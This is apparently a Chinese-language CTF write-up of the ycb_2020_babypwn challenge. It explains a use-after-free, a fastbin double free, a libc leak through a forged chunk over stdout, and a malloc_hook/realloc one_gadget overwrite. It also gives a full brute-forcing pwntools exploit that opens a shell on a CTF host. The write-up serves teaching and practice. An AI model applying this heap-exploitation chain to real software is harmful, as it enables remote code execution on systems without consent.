# ycb_2020_babypwn


### 总结
根据本题，学习与收获有：

- `stdout`结构体上方和`malloc_hook`上方均能伪造大小为`0x70`的`chunk`。一个用来泄露`libc`地址，一个用来`getshell`。

- 当程序没有`show`功能的时候，可以利用`fastbin attack`，这时候，可伪造大小为`0x70`的`fastbin chunk`到`stdout`结构体的上方，将`flag`修改为`0x0FBAD1887`，将`_IO_write_base`的低字节修改一下，比如修改为`0x58`。
- 有时候，直接劫持`malloc_hook`为`one_gadget`可能无法滿足条件，这个时候，可以利用`malloc_hook`上方的`realloc_hook`，利用`realloc`函数开头的几个`pop`指令，来调整栈帧。这个时候，设置`realloc_hook`为`one_gadget`，`malloc_hook`为`realloc`函数地址加上一个偏移，这里的偏移可以慢慢调试，选取`2、4、6、12`等。
- 构造`overlapped`的`chunk`的时候，有时候并不一定需要完全改写整个`fd`指针的内容，可以根据偏移只改写部分低字节。
- `main_arena+88`或者`main_arena+96`距离`stdout`上方的`fake chunk`地址很近，只需修改低`2`位的字节，低`1`位的字节，固定为`\xdd`。

<!-- more -->

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405104438.png)

可以看到，保护全开。

#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405104536.png)

同样的，函数我均已经重命名过了。方便做题。很典型的菜单题。

##### menu

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405104626.png)

选项很简单，只有添加和删除。

##### Add

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405105331.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405105400.png)

有几个点需要注意一下：

- 最多只能分配`20`次
- 每次分配用户指定大小的`chunk`前，会分配一个`0x30`大小的`chunk A`用来管理后面的`chunk B`
- 用户指定的大小不能超过`0x70`，也就是说，所有的为用户分配的`chunk`，范围都在`fastbin`
- `A[0]`写的是`1`，`A[1]`写的是`chunk B`的地址，`A[2]`开始，写的是`messgae`，且没有溢出。

##### Delete

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405105831.png)

这里需要注意：

- 只释放了上面的`Add`函数中的`chunk B`， 没有释放有管理功能的`chunk A`，但是把`A[0]`写为了`0`。
- 释放后指针没有置空，存在`uaf`。

#### 漏洞点

题目很精炼，漏洞点也比较好找。就是在`Delete`函数中，存在的一个`uaf`漏洞。由于靶机的环境是`ubuntu 16.04`，使用的`libc`版本为`libc-2.23.so`，因此，很显然就想到了使用`fastbin double free attack`。

### 利用思路

#### 知识点

- `fastbin`对`double free`的检测，是有一定的缺陷的。不像后来的`tcache bin`的检测，会去检查整条链中是否存在一样的被释放的`chunk`，`fastbin`只会去检查上一个`chunk`与当前的要释放的`chunk`是不是一样的。
- `fastbin double free`利用的过程为`free A ----> free B ----> free A`。这里的`A、B`的大小要一样。之后，分配第一次的时候，改写`fd`指针为指定地址，然后连续分配两次，第四次分配，就能到指定地址获取`chunk`。也就是说，这里需要分配`4`次，才能分配到`fake chunk`。

#### 利用过程

由于题目没有`edit`的功能，所以利用起来还是很麻烦的，需要反复地进行`malloc`与`free`。

整体的利用思路如下：

- 构造出`A-->B-->A`的`overlapped`的`fastbin chunk`，同时做好堆内容的填写，便于使用`fake chunk`
- 修改`A`的`fd`指针的低字节，分配到`fake chunk C`处，让这个`chunk C`能修改到`chunk B`的`size`域和`fd`域
- 修改`chunk B`的`size`域，使其大于等于`0x90`，保证释放后能被放在`unsorted bin`中去，且`fd`和`bk`指针被写入一个`libc`地址
- 修改上面`chunk B`的`fd`的低`2`个字节，分配到`stdout`结构体上方，这里需要爆破一下。
- 修改`stdout`的`flag`字段和`write_base`的低字节，获取到`libc`地址
- 利用`fastbin double free`分配到`malloc_hook`，利用`realloc + one_gadget`来`get_shell`

详细利用步骤：

- 分配两个`0x70`大小的`chunk 0`和`chunk 1`，并把内容填充为`0x0000000000000071`，方便后续伪造`chunk`
- 依次释放`chunk 0--->1--->0`，然后分配大小为`0x70`的`chunk 2`，修改`fd`的低字节为`0x20`，继续分配`chunk 3、4`
- 分配`chunk 5`，那么`chunk 5`就能改写`chunk 0`的`size`和`fd`域
- 先释放`chunk 0`，再释放`chunk 5`，然后分配`chunk 6`，修改`chunk 0`的`size`域为`0x91`
- 再释放`chunk 0`，这样就得到了一个`unsorted bin`，且把释放了的`chunk 0`的`fd`写为了一个堆地址
- 分配一个`0x30`大小的`chunk 7`，避免后续分配管理的`chunk`的时候，从`unsorted bin`里面切割。
- 再次释放`chunk 6`，分配`chunk 8`，修改`chunk 0`的`size`为`0x71`和`fd`的低`2`个字节，使其`fd`指向`stdout`结构体上方的那个`fake chunk`
- 分配到`stdout`上方的`fake chunk`，修改`stdout`结构体的`flag`和`write_base`，泄露出堆地址
- 利用`double free`分配到`malloc_hook`附近，结合`realloc`调整栈帧，利用`one_gadget`获取`shell`

### EXP

#### 调试过程

这里展示本地调试的过程，手动输入需要爆破的那个字节大小。

首先准备好各个函数：

```python
def Add(sh:tube, size:int, name:(str, bytes), 
        msg:(str, bytes)=8 * b'\x00' + p64(0x71) + b'\x00' * 7):
    assert size > 0 and size <= 0x70
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(size))
    sh.sendafter("game's name:\n", name)
    sh.sendlineafter("game's message:\n", msg)
    return sh.recvline()


def Delete(sh:tube, idx:int):
    sh.sendlineafter("Your choice : ", '2')
    sh.sendlineafter("game's index:\n", str(idx))
    sh.recvline()
```

分配两个`chunk`并释放，构造`overlapped chunk`：

```python
Add(sh, 0x60, 14 * p64(0x71)) # 0
Add(sh, 0x60, 14 * p64(0x71)) # 1
Delete(sh, 0)
Delete(sh, 1)
Delete(sh, 0)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115211.png)

修改低字节为`0x20`：

```python
Add(sh, 0x60, '\x20') # 2
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115424.png)

修改`chunk 0`的`size`域为`0x91`，得到`unsorted bin chunk`，并构造出`fastbin`与`unsorted bin`重合的堆布局，准备好`0x30`大小的`chunk`，避免切割`unsorted bin`：

```python
Add(sh, 0x60, '\x20') # 3
Add(sh, 0x60, '\x20') # 4
Add(sh, 0x60, p64(0) + p64(0x71)) # 5

Delete(sh, 0)
Delete(sh, 5)

Add(sh, 0x60, p64(0) + p64(0x91)) # 6
Add(sh, 0x20, 'bbbb') # 7
Delete(sh, 0)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115522.png)

修改`chunk 0`的`size`为`0x71`，修改`fd`指针的低2个字节，释放掉好`0x30`大小的`chunk`：

```python
get = input('get low 2th byte (hex):')
get = int16(get)
get = get.to_bytes(1, 'big')
Add(sh, 0x60, p64(0) + p64(0x71) + b'\xdd' + get) # 8
Delete(sh, 7)
Add(sh, 0x60, 'deadbeef') # 9
```

首先看要修改的那个`fake chunk`的地址：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115927.png)

可以顺便看一下`stdout`结构体：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120338.png)

这里我们输入`0x75`就能分配到这个`fake chunk`处。

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120532.png)

分配到`stdout`结构体上方，泄露出`libc`地址：

```python
Delete(sh, 7)

# 10
sh.sendlineafter("Your choice : ", '1')
sh.sendlineafter("size of the game's name: \n", str(0x60))
sh.sendafter("game's name:\n", 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58')
leak_libc_addr = u64(sh.recvn(8))
sh.sendlineafter("game's message:\n", 'aaa')
LOG_ADDR('leak_libc_addr', leak_libc_addr)

libc_base_addr = leak_libc_addr -  0x3c56a3
LOG_ADDR('libc_base_addr', libc_base_addr)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120723.png)

再次分配到`malloc_hook`，并利用`realloc`调整栈帧，这里选则的偏移是`0xd`：

```python
Delete(sh, 5)
Delete(sh, 0)
Delete(sh, 5)

target_addr = libc_base_addr + malloc_hook_offset - 0x23

Delete(sh, 7)
Add(sh, 0x60, p64(target_addr)) # 11

Delete(sh, 7)
Add(sh, 0x60, p64(target_addr))

Delete(sh, 7)
Add(sh, 0x60, p64(target_addr))

Delete(sh, 7)
one_gadget = libc_base_addr + gadget_offset
Add(sh, 0x60, 0xb * b'a' + p64(one_gadget) + p64(libc_base_addr + realloc_offset + 0xd))

LOG_ADDR('one_gadget addr', one_gadget)
sh.sendlineafter("Your choice : ", '1')
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120901.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121007.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121052.png)

#### 完整exp

完整的`exp`是需要爆破的：

```python
from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)


def Add(sh:tube, size:int, name:(str, bytes), 
        msg:(str, bytes)=8 * b'\x00' + p64(0x71) + b'\x00' * 7):
    assert size > 0 and size <= 0x70
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(size))
    sh.sendafter("game's name:\n", name)
    sh.sendlineafter("game's message:\n", msg)
    return sh.recvline()


def Delete(sh:tube, idx:int):
    sh.sendlineafter("Your choice : ", '2')
    sh.sendlineafter("game's index:\n", str(idx))
    sh.recvline()

def attack(sh:process, malloc_hook_offset, gadget_offset, 
            realloc_offset, low_2th_byte:int=0xe5):
    Add(sh, 0x60, 14 * p64(0x71)) # 0

    Add(sh, 0x60, 14 * p64(0x71)) # 1
    Delete(sh, 0)

    Delete(sh, 1)
    Delete(sh, 0)

    Add(sh, 0x60, '\x20') # 2

    Add(sh, 0x60, '\x20') # 3

    Add(sh, 0x60, '\x20') # 4

    Add(sh, 0x60, p64(0) + p64(0x71)) # 5


    Delete(sh, 0)
    Delete(sh, 5)

    Add(sh, 0x60, p64(0) + p64(0x91)) # 6
    Add(sh, 0x20, 'bbbb') # 7

    Delete(sh, 0)

    Delete(sh, 5)
    Delete(sh, 7)

    # get = input('get low 2th byte (hex):')
    # get = int16(get)
    get = low_2th_byte.to_bytes(1, 'big')
    Add(sh, 0x60, p64(0) + p64(0x71) + b'\xdd' + get) # 8
    Delete(sh, 7)
    Add(sh, 0x60, 'deadbeef') # 9
    Delete(sh, 7)

    # 10
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(0x60))
    sh.sendafter("game's name:\n", 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58')
    leak_libc_addr = u64(sh.recvn(8))
    sh.sendlineafter("game's message:\n", 'aaa')
    LOG_ADDR('leak_libc_addr', leak_libc_addr)

    libc_base_addr = leak_libc_addr -  0x3c56a3
    LOG_ADDR('libc_base_addr', libc_base_addr)

    # gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1207]
    # realloc_offset = 0x84710

    Delete(sh, 5)
    Delete(sh, 0)
    Delete(sh, 5)

    # malloc_hook_offset = 0x3c4b10
    target_addr = libc_base_addr + malloc_hook_offset - 0x23

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr)) # 11

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr))

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr))

    Delete(sh, 7)
    one_gadget = libc_base_addr + gadget_offset
    Add(sh, 0x60, 0xb * b'a' + p64(one_gadget) + p64(libc_base_addr + realloc_offset + 0xd))

    LOG_ADDR('one_gadget addr', one_gadget)
    sh.sendlineafter("Your choice : ", '1')

    sh.sendline('cat flag')
    sh.recvline_contains(b'flag', timeout=2)
    sh.interactive()


if __name__ == '__main__':
    while True:
        try:
            # sh = process('./ycb_2020_babypwn')
            sh = remote("node3.buuoj.cn", 28643)
            r_realloc = 0x846c0
            r_gadget = 0x4526a
            attack(sh, 0x3c4b10, r_gadget, r_realloc)
        except:
            sh.close()
```

爆破的效果如图：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405122710.png)

### 引用与参考

无


---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-04-04-ycb-2020-babypwn/  

